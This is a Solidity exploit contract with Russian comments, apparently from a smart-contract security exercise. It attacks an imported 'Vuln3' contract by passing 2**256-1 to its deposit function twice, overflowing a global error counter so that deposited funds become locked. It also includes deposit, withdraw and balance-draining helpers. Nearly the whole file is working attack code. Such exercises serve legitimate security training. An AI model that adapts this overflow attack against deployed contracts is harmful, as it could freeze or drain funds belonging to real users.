// SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.8;


import "hardhat/console.sol";

import "./Vuln3.sol";



contract Exploit3 {

    address private owner;
    Vuln3 public vulnerableContract;
    Vuln3Executor public exContract;

    constructor () payable {

        // запоминаем кто задеплоил эксплоит
        owner = msg.sender;
    }

    
    receive() external payable {
       
    }

    
    modifier OnlyOwner () {
        require(msg.sender == owner, "OnlyOwner");
        _;
    }

    // Сюда нужно передать адрес нужного контракта Vuln3.
    function InitExploit3 (address addr) public payable OnlyOwner {
        vulnerableContract = Vuln3(addr);
        address a = vulnerableContract.GetExecutor();
        exContract = Vuln3Executor(a);
        
    }
    
    
    //переполнение глобальной errorAmount
    //блокировка средств
    function attack() public payable {
        vulnerableContract.deposit{value: 0 ether}(2**256-1);
        vulnerableContract.deposit{value: 0 ether}(2**256-1);
        //vulnerableContract.deposit{value: 20 ether}(2**256-1); //после такого переполнения депозит уже не забрать?
        //даже с другим контрактом
        //и другим аккаунтом
        //exContract.deposit{value: 5 ether}(0);
        //vulnerableContract.withdraw(20 ether);
        
    }

    function setDep() public payable{
        vulnerableContract.deposit{value: 5 ether}(0);
    }

    function attackGet() public payable{
        vulnerableContract.withdraw(5 ether);
    }
    

    function getEther() public {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
}